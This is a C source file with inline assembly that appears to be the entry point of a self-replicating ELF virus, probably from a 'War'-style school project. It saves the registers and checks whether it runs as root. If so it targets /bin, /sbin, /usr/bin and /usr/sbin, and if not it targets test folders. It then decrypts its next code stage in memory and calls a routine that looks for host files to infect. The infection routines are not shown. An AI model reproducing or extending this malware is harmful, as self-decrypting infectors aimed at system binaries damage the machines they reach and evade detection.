#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// ASM VOLATILE 
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline uid_t _getuid(void)
{
	uid_t ret;

	asm volatile
	(
		"mov rax, 0x66\n"
		"syscall\n"
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void __entry(void)
{
	asm volatile
	(
		"push rbx\n"
		"push rsp\n"
		"push rbp\n"
		"push rax\n"
		"push rdi\n"
		"push rsi\n"
		"push rdx\n"
		"push rcx\n"
		"push r8\n"
		"push r9\n"
		"push r10\n"
		"push r11\n"
		"push r12\n"
		"push r13\n"
		"push r14\n"
		"push r15\n"
	);

	struct s_keychain keychain = {0};
	struct s_host host = {0};

	asm volatile
	(
		"mov %0, rsp\n"
		: "=r"(host.stack)
		:
	);

	void *dir;
	size_t size;

	if (_getuid() == 0)
	{
		struct s_directory root[] =
		{
			{"/bin/", 0},
			{"/sbin/", 0},
			{"/usr/bin/", 0},
			{"/usr/sbin/", 0},
		};
		dir = root;
		size = sizeof(root) / sizeof(root[0]);
	}
	else
	{
		struct s_directory user[] =
		{
			{"/tmp/test/", 0},
			{"/tmp/test2/", 0},
		};
		dir = user;
		size = sizeof(user) / sizeof(user[0]);
	}

	update_keychain_left(&keychain, (char *)__entry, (void *)find_host - (void *)__entry);
	decrypt_left(&keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);

	find_host(&host, &keychain, dir, size, SUCCESS);
}
